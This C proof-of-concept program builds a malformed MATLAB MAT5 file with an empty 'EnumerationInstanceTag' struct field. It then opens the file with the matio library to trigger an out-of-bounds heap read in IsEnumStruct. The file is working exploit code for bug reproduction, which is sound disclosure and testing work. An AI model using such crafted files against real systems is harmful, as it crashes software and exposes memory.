/* PoC: OOB read in IsEnumStruct via a struct whose "EnumerationInstanceTag"
 * field is a 0x0 uint32 matrix (0-byte data payload).
 *
 * Mat_Open + Mat_VarReadNext on the crafted MAT5 file makes
 * Mat_MCOS_ReadEnum -> HasEnumStruct -> IsEnumStruct dereference
 * ((const mat_uint32_t *)tag->data)[0] on a 0-byte heap buffer.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "matio.h"

static void put_u32(unsigned char **p, unsigned int v)
{
    (*p)[0] = (unsigned char)(v & 0xff);
    (*p)[1] = (unsigned char)((v >> 8) & 0xff);
    (*p)[2] = (unsigned char)((v >> 16) & 0xff);
    (*p)[3] = (unsigned char)((v >> 24) & 0xff);
    *p += 4;
}

int main(int argc, char **argv)
{
    const char *path = argc > 1 ? argv[1] : "poc_enum_tag.mat";
    unsigned char buf[512];
    unsigned char *p = buf;
    unsigned char *content;
    unsigned int content_size;
    const char *text =
        "MATLAB 5.0 MAT-file, Platform: GLNXA64, Created by matio PoC";
    mat_t *mat;
    matvar_t *var;
    FILE *f;

    /* 128-byte MAT5 header */
    memset(buf, ' ', 116);
    memcpy(buf, text, strlen(text));
    p = buf + 116;
    memset(p, 0, 8); /* subsystem offset */
    p += 8;
    put_u32(&p, 0x4d490100u); /* version 0x0100 + endian "IM" */

    /* Top-level data element: miMATRIX */
    content = p + 8;

    {
        unsigned char *c = content;

        /* Array flags: miUINT32, 8 bytes -> class mxSTRUCT (2) */
        put_u32(&c, 6);
        put_u32(&c, 8);
        put_u32(&c, 2);
        put_u32(&c, 0);

        /* Dimensions: miINT32, 8 bytes -> 1x1 */
        put_u32(&c, 5);
        put_u32(&c, 8);
        put_u32(&c, 1);
        put_u32(&c, 1);

        /* Array name, small element format: 1 byte "x" */
        put_u32(&c, (1u << 16) | 1u);
        put_u32(&c, 'x');

        /* Field name length, small element format: 32 */
        put_u32(&c, (4u << 16) | 5u);
        put_u32(&c, 32);

        /* Field names: miINT8, 32 bytes */
        put_u32(&c, 1);
        put_u32(&c, 32);
        memset(c, 0, 32);
        memcpy(c, "EnumerationInstanceTag", 22);
        c += 32;

        /* Field data: one miMATRIX holding a 0x0 uint32 array */
        put_u32(&c, 14);
        put_u32(&c, 48);

        /* Array flags: miUINT32, 8 bytes -> class mxUINT32 (13) */
        put_u32(&c, 6);
        put_u32(&c, 8);
        put_u32(&c, 13);
        put_u32(&c, 0);

        /* Dimensions: miINT32, 8 bytes -> 0x0 */
        put_u32(&c, 5);
        put_u32(&c, 8);
        put_u32(&c, 0);
        put_u32(&c, 0);

        /* Array name: miINT8, 0 bytes (empty) */
        put_u32(&c, 1);
        put_u32(&c, 0);

        /* Real part: miUINT32, 0 bytes (empty payload) */
        put_u32(&c, 6);
        put_u32(&c, 0);

        content_size = (unsigned int)(c - content);
    }

    /* Top-level element tag now that the size is known */
    put_u32(&p, 14);
    put_u32(&p, content_size);
    p += content_size;

    f = fopen(path, "wb");
    if ( f == NULL ) {
        perror("fopen");
        return 2;
    }
    fwrite(buf, 1, (size_t)(p - buf), f);
    fclose(f);

    mat = Mat_Open(path, MAT_ACC_RDONLY);
    if ( mat == NULL ) {
        fprintf(stderr, "Mat_Open failed\n");
        return 2;
    }
    while ( NULL != (var = Mat_VarReadNext(mat)) ) {
        Mat_VarFree(var);
    }
    Mat_Close(mat);

    printf("done\n");
    return 0;
}
